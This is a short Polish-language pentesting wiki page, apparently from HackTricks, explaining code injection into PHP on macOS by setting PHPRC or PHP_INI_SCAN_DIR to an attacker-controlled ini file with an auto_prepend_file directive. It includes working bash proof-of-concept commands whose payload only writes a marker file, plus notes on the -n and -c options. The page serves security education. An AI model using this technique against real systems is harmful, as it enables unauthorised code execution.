# Injection w aplikacjach PHP w systemie macOS

{{#include ../../../banners/hacktricks-training.md}}

## `PHPRC` / `PHP_INI_SCAN_DIR` i `auto_prepend_file`

PHP CLI i CGI odczytują konfigurację przy każdym uruchomieniu. `PHPRC` może wskazywać plik `php.ini`, który jest dostępny do odczytu dla attackera, natomiast `PHP_INI_SCAN_DIR` może przekierować katalog skanowany w poszukiwaniu dodatkowych plików `.ini`. Dyrektywa `auto_prepend_file` sprawia, że PHP analizuje plik przed żądanym skryptem, dzięki czemu ta kombinacja prowadzi do wykonania kodu podczas uruchamiania.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
cat >/tmp/php-payload.php <<'PHP'
<?php file_put_contents('/tmp/php-prepend-executed', 'ok'); ?>
PHP
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/attacker-php.ini

PHPRC=/tmp/attacker-php.ini php victim.php
```
Alternatywą jest katalog zawierający plik `.ini`:
```bash
mkdir -p /tmp/php-conf.d
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/php-conf.d/99-prepend.ini
PHP_INI_SCAN_DIR=/tmp/php-conf.d php victim.php
```
Opcja `-n` ignoruje `php.ini`; jawna zaufana ścieżka `-c` ma pierwszeństwo przed `PHPRC`. Pamiętaj, że długo działający serwer SAPI zwykle odczytuje konfigurację podczas uruchamiania serwera WWW, podczas gdy CLI i CGI robią to przy każdym wywołaniu.<sup>[[1]](#references)</sup>

## References

- [1] [Plik konfiguracyjny PHP](https://www.php.net/manual/en/configuration.file.php)
- [2] [PHP `auto_prepend_file`](https://www.php.net/manual/en/ini.core.php#ini.auto-prepend-file)
{{#include ../../../banners/hacktricks-training.md}}
